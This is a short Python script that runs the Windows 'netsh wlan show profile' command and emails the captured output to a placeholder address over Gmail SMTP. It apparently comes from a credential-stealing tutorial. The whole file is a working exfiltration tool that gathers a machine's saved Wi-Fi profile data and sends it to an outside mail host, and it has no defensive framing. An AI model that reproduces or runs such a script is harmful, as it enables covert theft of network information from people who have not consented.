import subprocess , smtplib

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
result = subprocess.check_output(command, shell=True)

send_mail("EMAIL", "APP PASS FOR EMAIL", result)
# This script will send an email to the specified email address with the results of the command.
